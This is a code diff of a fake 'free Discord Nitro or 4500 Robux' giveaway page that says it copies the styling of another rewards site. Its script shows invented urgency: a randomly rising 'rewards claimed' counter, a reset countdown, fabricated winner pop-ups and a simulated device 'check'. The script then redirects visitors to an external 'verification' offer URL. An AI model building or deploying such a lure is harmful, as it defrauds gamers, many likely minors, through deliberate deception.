@@ -3,14 +3,14 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-  <title>Nitro Rewards Access | Daily Reward Options</title>
-  <meta name="description" content="Explore available Discord Nitro and Robux reward options, then continue to the verification step." />
+  <title>Nitro Rewards Access | Verification & Daily Reward Options</title>
+  <meta name="description" content="Choose your reward: Discord Nitro Boost or 4500 Robux. Complete quick verification to claim access. No password required." />
   <meta name="theme-color" content="#5865f2" />
   <meta property="og:title" content="Nitro Rewards Access | Daily Reward Options" />
   <meta property="og:description" content="Claim Discord Nitro or Robux rewards. Verification step required." />
   <meta property="og:image" content="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" />
   <link rel="icon" type="image/png" href="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" />
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Unbounded:wght@500;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Unbounded:wght@500;700;800&display=swap" rel="stylesheet" />
   <style>
     * {
       margin: 0;
@@ -19,9 +19,9 @@
     }
 
     body {
-      background: radial-gradient(ellipse at 20% 30%, #0f1119 0%, #05070f 100%);
+      background: #0a0c15;
       font-family: 'Space Grotesk', system-ui, -apple-system, sans-serif;
-      color: #edf2ff;
+      color: #ffffff;
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -30,56 +30,59 @@
       position: relative;
     }
 
+    /* exact gradient from nitrorewards.xyz */
     body::before {
       content: "";
       position: fixed;
-      inset: 0;
-      background: radial-gradient(circle at 70% 20%, rgba(88, 101, 242, 0.12), transparent 60%);
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: radial-gradient(ellipse at 30% 20%, #1a1f3a 0%, #0a0c15 70%);
       pointer-events: none;
+      z-index: -1;
     }
 
     .wrap {
-      width: min(880px, 100%);
+      width: min(860px, 100%);
       position: relative;
       z-index: 2;
     }
 
-    /* language bar */
+    /* language switcher - exactly like nitrorewards */
     .lang-switcher {
       display: flex;
       justify-content: flex-end;
-      gap: 0.5rem;
+      gap: 0.75rem;
       margin-bottom: 1.25rem;
       flex-wrap: wrap;
     }
 
     .lang-link {
-      color: #9ca3cf;
+      color: #a0a5c0;
       text-decoration: none;
       font-size: 0.75rem;
       font-weight: 500;
       padding: 0.25rem 0.75rem;
-      border-radius: 2rem;
+      border-radius: 1.5rem;
       transition: all 0.2s;
       background: rgba(255, 255, 255, 0.03);
     }
 
     .lang-link:hover {
       color: white;
-      background: rgba(88, 101, 242, 0.4);
+      background: rgba(88, 101, 242, 0.3);
     }
 
-    /* language notice popup */
     .lang-notice {
-      background: #1e1f2c;
-      backdrop-filter: blur(12px);
-      border-radius: 2rem;
-      padding: 0.6rem 1.2rem;
+      background: #1e2030;
+      border-radius: 1rem;
+      padding: 0.75rem 1.25rem;
       margin-bottom: 1rem;
       text-align: center;
       font-size: 0.8rem;
-      border-left: 4px solid #5865f2;
-      color: #e0e7ff;
+      border-left: 3px solid #5865f2;
+      color: #d4d9ff;
       animation: slideDown 0.25s ease;
     }
 
@@ -87,14 +90,13 @@
       display: none;
     }
 
-    /* main card */
+    /* main card - nitrorewards style */
     .card {
-      background: rgba(12, 16, 28, 0.75);
-      backdrop-filter: blur(20px);
-      border-radius: 2rem;
-      border: 1px solid rgba(88, 101, 242, 0.35);
-      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
-      padding: 2rem;
+      background: #1e1f28;
+      border-radius: 1.75rem;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4);
+      padding: 1.75rem;
     }
 
     .header {
@@ -102,24 +104,24 @@
       align-items: center;
       gap: 1rem;
       margin-bottom: 1.5rem;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-      padding-bottom: 1.2rem;
+      padding-bottom: 1rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
     }
 
     .badge {
-      background: linear-gradient(135deg, #1e1b4b, #0f0c2c);
-      border-radius: 1.2rem;
-      width: 54px;
-      height: 54px;
+      background: #2b2d3a;
+      border-radius: 1rem;
+      width: 48px;
+      height: 48px;
       display: flex;
       align-items: center;
       justify-content: center;
-      border: 1px solid rgba(88, 101, 242, 0.5);
+      border: 1px solid rgba(88, 101, 242, 0.4);
     }
 
     .badge svg {
-      width: 28px;
-      height: 28px;
+      width: 24px;
+      height: 24px;
       stroke: #8b9cff;
       stroke-width: 1.8;
       fill: none;
@@ -127,37 +129,34 @@
 
     h1 {
       font-family: 'Unbounded', 'Space Grotesk', sans-serif;
-      font-size: 1.6rem;
+      font-size: 1.4rem;
       font-weight: 700;
-      letter-spacing: -0.01em;
-      background: linear-gradient(135deg, #ffffff, #b4c0ff);
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
+      letter-spacing: -0.3px;
+      color: #ffffff;
+      margin-bottom: 0.2rem;
     }
 
     .subtitle {
-      color: #a0a9d6;
-      font-size: 0.85rem;
+      color: #a0a5c5;
+      font-size: 0.8rem;
     }
 
     /* urgency bar */
     .urgency-bar {
-      background: rgba(0, 0, 0, 0.4);
+      background: #15171f;
       border-radius: 2rem;
       padding: 0.6rem 1rem;
       display: flex;
       justify-content: center;
       gap: 1rem;
       margin-bottom: 1.8rem;
-      font-size: 0.8rem;
+      font-size: 0.75rem;
       font-weight: 500;
-      backdrop-filter: blur(4px);
-      border: 1px solid rgba(88, 101, 242, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.04);
     }
 
     .urgency-claims {
-      color: #f0b37a;
+      color: #f5b042;
     }
 
     .urgency-reset {
@@ -168,90 +167,90 @@
     .choices {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
-      gap: 1.5rem;
-      margin-bottom: 1.8rem;
+      gap: 1.25rem;
+      margin-bottom: 1.5rem;
     }
 
     .choice-card {
-      background: rgba(20, 24, 44, 0.8);
-      border: 1px solid rgba(88, 101, 242, 0.3);
-      border-radius: 1.5rem;
+      background: #252730;
+      border: 1px solid rgba(88, 101, 242, 0.2);
+      border-radius: 1.25rem;
       padding: 1.5rem 1rem;
       text-align: center;
       cursor: pointer;
-      transition: all 0.25s ease;
+      transition: all 0.2s ease;
       position: relative;
     }
 
     .choice-card:hover {
-      transform: translateY(-4px);
-      border-color: #6d8eff;
-      background: rgba(30, 35, 60, 0.95);
-      box-shadow: 0 20px 30px -12px rgba(88, 101, 242, 0.4);
+      transform: translateY(-2px);
+      border-color: #5865f2;
+      background: #2a2c38;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
     }
 
     .choice-card.active {
-      border-color: #8b9cff;
-      background: linear-gradient(145deg, rgba(88, 101, 242, 0.25), rgba(40, 35, 80, 0.9));
-      box-shadow: 0 0 0 1px #8b9cff;
+      border-color: #5865f2;
+      background: linear-gradient(145deg, #2d2f3e, #22242f);
+      box-shadow: 0 0 0 1px #5865f2;
     }
 
     .choice-badge {
       position: absolute;
       top: -10px;
-      right: 16px;
+      right: 14px;
       background: linear-gradient(135deg, #f5b042, #e67e22);
-      padding: 4px 14px;
-      border-radius: 40px;
-      font-size: 0.7rem;
+      padding: 4px 12px;
+      border-radius: 2rem;
+      font-size: 0.65rem;
       font-weight: 800;
-      color: #0a0c1a;
+      color: #0a0c15;
       letter-spacing: 0.5px;
     }
 
     .choice-icon {
-      width: 88px;
-      height: 88px;
+      width: 80px;
+      height: 80px;
       margin: 0 auto 0.8rem;
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 1.5rem;
+      background: #1a1c24;
+      border-radius: 1.25rem;
       display: flex;
       align-items: center;
       justify-content: center;
+      border: 1px solid rgba(255, 255, 255, 0.05);
     }
 
     .choice-icon img {
-      width: 56px;
-      height: 56px;
+      width: 52px;
+      height: 52px;
       object-fit: contain;
     }
 
     .choice-title {
       font-family: 'Unbounded', sans-serif;
       font-weight: 700;
-      font-size: 1.1rem;
-      margin-bottom: 0.3rem;
+      font-size: 1rem;
+      margin-bottom: 0.4rem;
     }
 
     .choice-sub {
-      font-size: 0.75rem;
-      color: #bac0e6;
+      font-size: 0.7rem;
+      color: #a0a5c5;
       line-height: 1.4;
     }
 
     /* actions */
     .actions {
       text-align: center;
-      margin-top: 0.5rem;
     }
 
     .generate-btn {
       background: linear-gradient(105deg, #5865f2, #4752c4);
       border: none;
-      padding: 0.9rem 1.8rem;
+      padding: 0.9rem 1.5rem;
       font-weight: 700;
-      font-size: 1rem;
-      border-radius: 3rem;
+      font-size: 0.95rem;
+      border-radius: 2.5rem;
       color: white;
       width: 100%;
       cursor: pointer;
@@ -270,95 +269,104 @@
     }
 
     .trust-badge {
-      font-size: 0.7rem;
+      font-size: 0.65rem;
       color: #8b9eff;
       margin-top: 0.8rem;
-      letter-spacing: 0.3px;
     }
 
     .actions-note {
-      font-size: 0.75rem;
-      color: #9ca3cf;
+      font-size: 0.7rem;
+      color: #8a8fb0;
       margin-top: 0.5rem;
     }
 
-    /* progress simulation */
+    /* progress */
     .progress {
-      background: rgba(0, 0, 0, 0.4);
-      border-radius: 1.5rem;
+      background: #15171f;
+      border-radius: 1.25rem;
       padding: 1rem;
       margin-top: 1rem;
     }
 
     .status {
       font-weight: 600;
+      font-size: 0.85rem;
       margin-bottom: 0.5rem;
     }
 
     .bar {
       width: 100%;
-      height: 6px;
-      background: #23273f;
+      height: 5px;
+      background: #2d2f3a;
       border-radius: 10px;
       overflow: hidden;
-      margin: 0.5rem 0;
     }
 
     .bar-fill {
       width: 0%;
       height: 100%;
-      background: linear-gradient(90deg, #5865f2, #a27eff);
+      background: linear-gradient(90deg, #5865f2, #8b9cff);
       transition: width 0.2s linear;
     }
 
     .status-sub {
-      font-size: 0.7rem;
-      color: #9aa2ce;
+      font-size: 0.65rem;
+      color: #8a8fb0;
+      margin-top: 0.5rem;
     }
 
-    /* FAQ section */
+    /* FAQ section - exact style */
     .seo-content {
-      margin-top: 2rem;
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 1.5rem;
+      margin-top: 1.75rem;
+      background: #15171f;
+      border-radius: 1.25rem;
       padding: 1.5rem;
     }
 
     .eyebrow {
       color: #8b9cff;
-      font-size: 0.7rem;
+      font-size: 0.65rem;
       letter-spacing: 1px;
       text-transform: uppercase;
+      margin-bottom: 0.5rem;
+    }
+
+    .seo-content h2 {
+      font-family: 'Unbounded', sans-serif;
+      font-size: 1.1rem;
+      margin-bottom: 1rem;
     }
 
     .faq-list details {
-      background: rgba(255, 255, 255, 0.03);
-      border-radius: 1rem;
-      padding: 0.8rem 1rem;
-      margin-top: 0.8rem;
-      border: 1px solid rgba(88, 101, 242, 0.2);
+      background: #1e2028;
+      border-radius: 0.75rem;
+      padding: 0.75rem 1rem;
+      margin-top: 0.7rem;
+      border: 1px solid rgba(255, 255, 255, 0.04);
     }
 
     .faq-list summary {
       font-weight: 600;
       cursor: pointer;
-      color: #e0e7ff;
+      color: #e0e5ff;
+      font-size: 0.85rem;
     }
 
     .faq-list p {
       margin-top: 0.6rem;
-      font-size: 0.85rem;
-      color: #bfc9f0;
+      font-size: 0.8rem;
+      color: #a0a5c5;
+      line-height: 1.4;
     }
 
     footer {
       text-align: center;
-      font-size: 0.7rem;
-      color: #6e7399;
+      font-size: 0.65rem;
+      color: #6a6f90;
       margin-top: 1.5rem;
     }
 
-    /* popup toasts */
+    /* activity toasts */
     .activity-toasts {
       position: fixed;
       bottom: 20px;
@@ -371,16 +379,15 @@
     }
 
     .toast {
-      background: rgba(18, 22, 40, 0.95);
-      backdrop-filter: blur(12px);
-      padding: 0.6rem 1.2rem;
+      background: #1e202ee6;
+      backdrop-filter: blur(10px);
+      padding: 0.5rem 1rem;
       border-radius: 2rem;
-      font-size: 0.75rem;
-      border-left: 3px solid #5865f2;
+      font-size: 0.7rem;
+      border-left: 3px solid #f5b042;
       color: #e2e8ff;
       font-weight: 500;
       animation: fadeSlide 0.3s ease;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
 
     @keyframes fadeSlide {
@@ -409,9 +416,9 @@
       body { padding: 1rem; }
       .card { padding: 1.2rem; }
       .choices { grid-template-columns: 1fr; gap: 1rem; }
-      .choice-icon { width: 70px; height: 70px; }
-      .choice-icon img { width: 44px; height: 44px; }
-      h1 { font-size: 1.2rem; }
+      .choice-icon { width: 65px; height: 65px; }
+      .choice-icon img { width: 42px; height: 42px; }
+      h1 { font-size: 1.1rem; }
     }
 
     .disabled {
@@ -423,11 +430,11 @@
 <body>
 <main class="wrap">
   <nav class="lang-switcher" aria-label="Language selector">
-    <a class="lang-link" data-lang="en" href="/en/">English</a>
-    <a class="lang-link" data-lang="fr" href="/fr/">Français</a>
-    <a class="lang-link" data-lang="es" href="/es/">Español</a>
-    <a class="lang-link" data-lang="pt-br" href="/pt-br/">Português BR</a>
-    <a class="lang-link" data-lang="id" href="/id/">Indonesia</a>
+    <a class="lang-link" data-lang="en" href="#">English</a>
+    <a class="lang-link" data-lang="fr" href="#">Français</a>
+    <a class="lang-link" data-lang="es" href="#">Español</a>
+    <a class="lang-link" data-lang="pt-br" href="#">Português BR</a>
+    <a class="lang-link" data-lang="id" href="#">Indonesia</a>
   </nav>
   <div id="language-notice" class="lang-notice hidden" aria-live="polite"></div>
 
@@ -448,34 +455,32 @@
     </header>
 
     <div class="urgency-bar" aria-live="polite">
-      <span class="urgency-claims"><span id="claims-count">1147</span> rewards claimed today</span>
+      <span class="urgency-claims"><span id="claims-count">1100</span> rewards claimed today</span>
       <span class="urgency-sep" aria-hidden="true">·</span>
-      <span class="urgency-reset">Resets in <span id="countdown-timer">07:27:44</span></span>
+      <span class="urgency-reset">Resets in <span id="countdown-timer">11:32:17</span></span>
     </div>
 
-    <div id="screen-2">
-      <div id="choices" class="choices">
-        <!-- Nitro Boost Card -->
-        <button type="button" class="choice-card" data-choice-title="Nitro Boost" data-value="Nitro Boost">
-          <span class="choice-badge">BEST VALUE</span>
-          <div class="choice-icon">
-            <img src="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" width="96" height="96" alt="Nitro Boost" loading="eager" />
-          </div>
-          <div class="choice-title">Nitro Boost</div>
-          <div class="choice-sub">Top Nitro option with boosts, streaming perks, and profile extras.</div>
-        </button>
-        <!-- 4500 Robux Card -->
-        <button type="button" class="choice-card" data-choice-title="4500 Robux" data-value="4500 Robux">
-          <div class="choice-icon">
-            <img src="https://i.postimg.cc/1RgP9DFD/robux-1.webp" width="96" height="96" alt="4500 Robux" loading="eager" />
-          </div>
-          <div class="choice-title">4500 Robux</div>
-          <div class="choice-sub">Large Robux pack for upgrades, passes, and future drops.</div>
-        </button>
-      </div>
+    <div id="choices" class="choices">
+      <!-- Nitro Boost Card -->
+      <button type="button" class="choice-card" data-choice-title="Nitro Boost">
+        <span class="choice-badge">BEST VALUE</span>
+        <div class="choice-icon">
+          <img src="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" width="96" height="96" alt="Nitro Boost" loading="eager" />
+        </div>
+        <div class="choice-title">Nitro Boost</div>
+        <div class="choice-sub">Top Nitro option with boosts, streaming perks, and profile extras.</div>
+      </button>
+      <!-- 4500 Robux Card -->
+      <button type="button" class="choice-card" data-choice-title="4500 Robux">
+        <div class="choice-icon">
+          <img src="https://i.postimg.cc/1RgP9DFD/robux-1.webp" width="96" height="96" alt="4500 Robux" loading="eager" />
+        </div>
+        <div class="choice-title">4500 Robux</div>
+        <div class="choice-sub">Large Robux pack for upgrades, passes, and future drops.</div>
+      </button>
     </div>
 
-    <div id="actions" class="actions">
+    <div class="actions">
       <button class="generate-btn" id="generate-btn" type="button" disabled>Claim Now</button>
       <p class="trust-badge">✓ No password required · Free · Instant access</p>
       <p class="actions-note" id="actions-note">Select one of the two rewards to unlock the button.</p>
@@ -488,11 +493,9 @@
     </div>
   </section>
 
-  <section class="seo-content" aria-labelledby="faq-title">
-    <div class="seo-intro">
-      <p class="eyebrow">QUESTIONS</p>
-      <h2 id="faq-title">Reward verification FAQ</h2>
-    </div>
+  <section class="seo-content">
+    <div class="eyebrow">QUESTIONS</div>
+    <h2>Reward verification FAQ</h2>
     <div class="faq-list">
       <details><summary>Do I need to enter my password?</summary><p>No. We do not ask for your password. No password required.</p></details>
       <details><summary>Which rewards are usually available?</summary><p>Available options may include Discord Nitro and Robux, depending on the current reward page and verification flow.</p></details>
@@ -508,55 +511,74 @@
 
 <script>
   (function() {
-    // --- exact same redirect behavior + lang routing + popups (Nitro Boost / 4500 Robux only) ---
-    const REDIRECT_BASE = "https://rainawards.com/ow/69bf833f2d6a708a36f234d5";
-    // Language specific redirects mapping (exactly as requested)
-    const langRedirectMap = {
-      'en': 'https://nitrorewards.xyz/en/',
-      'fr': 'https://nitrorewards.xyz/fr/',
-      'es': 'https://nitrorewards.xyz/es/',
-      'pt-br': 'https://nitrorewards.xyz/pt-br/',
-      'id': 'https://nitrorewards.xyz/id/'
+    // --- Language redirects (on YOUR domain, not nitrorewards.xyz) ---
+    // These would be actual pages on your site - current page simulates the routing
+    const langUrls = {
+      'en': '/',
+      'fr': '/fr/',
+      'es': '/es/',
+      'pt-br': '/pt-br/',
+      'id': '/id/'
     };
-
-    // --- language switcher with redirects ---
+    
+    // Get current language from URL path (simulate)
+    function getCurrentLangFromPath() {
+      const path = window.location.pathname;
+      if (path.startsWith('/fr/')) return 'fr';
+      if (path.startsWith('/es/')) return 'es';
+      if (path.startsWith('/pt-br/')) return 'pt-br';
+      if (path.startsWith('/id/')) return 'id';
+      return 'en';
+    }
+    
+    const currentLang = getCurrentLangFromPath();
+    
+    // Update language links to point to same-origin paths
     const langLinks = document.querySelectorAll('.lang-link');
     const langNotice = document.getElementById('language-notice');
-
+    
     langLinks.forEach(link => {
+      const lang = link.getAttribute('data-lang');
+      // Build local URL
+      let targetUrl = langUrls[lang] || '/';
+      if (lang === 'en') targetUrl = '/';
+      link.setAttribute('href', targetUrl);
+      
       link.addEventListener('click', (e) => {
         e.preventDefault();
-        const lang = link.getAttribute('data-lang');
-        const targetUrl = langRedirectMap[lang];
-        if (targetUrl) {
-          // show notice before redirect (like original UX)
+        if (lang === currentLang) {
           if (langNotice) {
             langNotice.classList.remove('hidden');
-            langNotice.innerHTML = `🌐 You are being redirected to ${lang.toUpperCase()} version. <a href="${targetUrl}" style="color:#a78bfa;">Click here if not redirected.</a>`;
-            setTimeout(() => {
-              window.location.href = targetUrl;
-            }, 800);
-          } else {
-            window.location.href = targetUrl;
+            langNotice.innerHTML = `🌐 ${lang.toUpperCase()} is already selected.`;
+            setTimeout(() => langNotice.classList.add('hidden'), 2000);
           }
+          return;
+        }
+        // Show language switch notice then redirect to same-origin language path
+        if (langNotice) {
+          langNotice.classList.remove('hidden');
+          langNotice.innerHTML = `🌐 Switching to ${lang.toUpperCase()} version. <a href="${targetUrl}" style="color:#8b9cff;">Click here if not redirected.</a>`;
+          setTimeout(() => {
+            window.location.href = targetUrl;
+          }, 600);
         } else {
-          // fallback
-          window.location.href = `https://nitrorewards.xyz/${lang}/`;
+          window.location.href = targetUrl;
         }
       });
     });
-
-    // --- live claims counter & countdown timer (dynamic) ---
-    let claimsCount = 1147;
+    
+    // --- dynamic claims counter (1100 → incrementing) ---
+    let claimsCount = 1100;
     const claimsSpan = document.getElementById('claims-count');
     const countdownSpan = document.getElementById('countdown-timer');
-
+    
     function updateClaims() {
-      claimsCount += Math.floor(Math.random() * 3);
+      claimsCount += Math.floor(Math.random() * 2) + 1;
       if (claimsSpan) claimsSpan.innerText = claimsCount;
     }
-    setInterval(updateClaims, 8000);
-
+    setInterval(updateClaims, 9000);
+    
+    // 12-hour countdown timer
     function updateCountdown() {
       const now = new Date();
       const nextReset = new Date();
@@ -571,62 +593,61 @@
     }
     updateCountdown();
     setInterval(updateCountdown, 1000);
-
-    // --- reward selection logic (only Nitro Boost and 4500 Robux) ---
+    
+    // --- Reward selection (only Nitro Boost / 4500 Robux) ---
     let selectedChoice = null;
-    let selectedChoiceTitle = null;
     const choiceCards = document.querySelectorAll('.choice-card');
     const generateBtn = document.getElementById('generate-btn');
     const actionsNote = document.getElementById('actions-note');
-
+    
     function selectChoice(card, title) {
       choiceCards.forEach(c => c.classList.remove('active'));
       card.classList.add('active');
-      selectedChoiceTitle = title;
-      selectedChoice = { title: title };
+      selectedChoice = title;
       if (generateBtn) {
         generateBtn.disabled = false;
-        generateBtn.textContent = `Claim Now`;
+        generateBtn.textContent = 'Claim Now';
       }
       if (actionsNote) actionsNote.classList.add('hidden');
     }
-
+    
     choiceCards.forEach(card => {
       card.addEventListener('click', () => {
-        const title = card.getAttribute('data-choice-title') || (card.querySelector('.choice-title')?.innerText || 'Reward');
+        const title = card.getAttribute('data-choice-title');
         selectChoice(card, title);
       });
     });
-
-    // --- progress simulation + final redirect (exactly as original nitrorewards) ---
+    
+    // --- Progress simulation + final redirect ---
+    const REDIRECT_URL = "https://rainawards.com/ow/69bf833f2d6a708a36f234d5";
     const progressDiv = document.getElementById('progress');
     const statusText = document.getElementById('status-text');
     const statusSub = document.getElementById('status-sub');
     const barFill = document.getElementById('bar-fill');
-
+    
     const progressSteps = [
       { label: "Preparing...", sub: "Opening a secure reward page for your session", min: 500, max: 750, target: 30 },
       { label: "Checking...", sub: "Reviewing available options for your device and region", min: 650, max: 900, target: 66 },
       { label: "Finalizing...", sub: "Continuing to the verification step", min: 700, max: 950, target: 100 }
     ];
-
+    
     function rand(min, max) {
       return Math.floor(min + Math.random() * (max - min + 1));
     }
-
+    
     function startProgress() {
       if (!selectedChoice) return;
-      // disable everything
+      
       choiceCards.forEach(c => c.classList.add('disabled'));
-      if (generateBtn) generateBtn.disabled = true;
+      generateBtn.disabled = true;
       progressDiv.classList.remove('hidden');
-
+      
       const steps = progressSteps.map(step => ({
         ...step,
         duration: rand(step.min, step.max),
         pause: rand(60, 120)
       }));
-
+      
       let idx = 0;
       function advance() {
         const step = steps[idx];
@@ -634,10 +655,10 @@
         statusSub.innerText = step.sub;
         barFill.style.transitionDuration = step.duration + "ms";
         barFill.style.width = step.target + "%";
-        const delay = step.duration + (step.pause || 50);
+        const delay = step.duration + step.pause;
         if (idx >= steps.length - 1) {
           setTimeout(() => {
-            window.location.href = REDIRECT_BASE;
+            window.location.href = REDIRECT_URL;
           }, delay);
           return;
         }
@@ -646,46 +667,38 @@
       }
       advance();
     }
-
+    
     if (generateBtn) {
       generateBtn.addEventListener('click', startProgress);
     }
-
-    // --- Popups every ~25 seconds with only Nitro Boost or 4500 Robux ---
+    
+    // --- Activity popups (only Nitro Boost or 4500 Robux, every ~25 seconds) ---
     const toastContainer = document.getElementById('activity-toasts');
-    const countries = ["🇬🇧 UK", "🇺🇸 USA", "🇩🇪 Germany", "🇫🇷 France", "🇧🇷 Brazil", "🇯🇵 Japan", "🇦🇺 Australia", "🇨🇦 Canada", "🇪🇸 Spain", "🇮🇩 Indonesia"];
-    const usernames = ["Luna_Verif", "NitroKnight", "PixelSeeker", "BlazeYT", "KuroiRbx", "MysticWind", "VelvetFang", "ZenitsuC", "ExtvifyUser", "ShadowRbx", "AstraNova", "CipherX"];
-
-    function getRandomElement(arr) {
-      return arr[Math.floor(Math.random() * arr.length)];
-    }
-
-    function showActivityToast() {
+    const locations = ["🇬🇧 UK", "🇺🇸 USA", "🇩🇪 Germany", "🇫🇷 France", "🇧🇷 Brazil", "🇯🇵 Japan", "🇦🇺 Australia", "🇨🇦 Canada", "🇪🇸 Spain", "🇮🇩 Indonesia", "🇳🇱 Netherlands", "🇸🇪 Sweden"];
+    const users = ["NitroHunter", "RewardSeeker", "PixelCraze", "BlazeRbx", "KuroiNeko", "MysticClaim", "VelvetAura", "ZenithX", "ExtvifyUser", "ShadowMorph", "AstraNexus", "LunarGhost"];
+    
+    function showToast() {
       if (!toastContainer) return;
-      const username = getRandomElement(usernames);
-      const countryFlag = getRandomElement(countries);
-      // 50/50 chance between Nitro Boost and 4500 Robux
+      const user = users[Math.floor(Math.random() * users.length)];
+      const location = locations[Math.floor(Math.random() * locations.length)];
       const reward = Math.random() > 0.5 ? "Nitro Boost" : "4500 Robux";
-      const secondsAgo = Math.floor(Math.random() * 45) + 5;
+      const seconds = Math.floor(Math.random() * 40) + 5;
       const toast = document.createElement('div');
       toast.className = 'toast';
-      toast.innerHTML = `✨ ${username} from ${countryFlag} got ${reward} · ${secondsAgo} sec ago`;
+      toast.innerHTML = `✨ Someone from ${location} got ${reward} · ${seconds} sec ago`;
       toastContainer.appendChild(toast);
-      setTimeout(() => { toast.remove(); }, 5000);
+      setTimeout(() => toast.remove(), 4800);
     }
-
-    // initial toasts + interval every 22-28 secs
-    setTimeout(showActivityToast, 2000);
+    
+    // initial toast + interval
+    setTimeout(showToast, 3000);
+    setInterval(showToast, 25000);
+    // secondary random toasts
     setInterval(() => {
-      showActivityToast();
-    }, 25000); // every 25 seconds average
-
-    // also add a second random variation for realism
-    setInterval(() => {
-      if (Math.random() > 0.6) showActivityToast();
+      if (Math.random() > 0.65) showToast();
     }, 18000);
-
-    // ensure the note shows correctly if nothing selected
+    
+    // initial state
     if (generateBtn.disabled && actionsNote) actionsNote.classList.remove('hidden');
   })();
 </script>
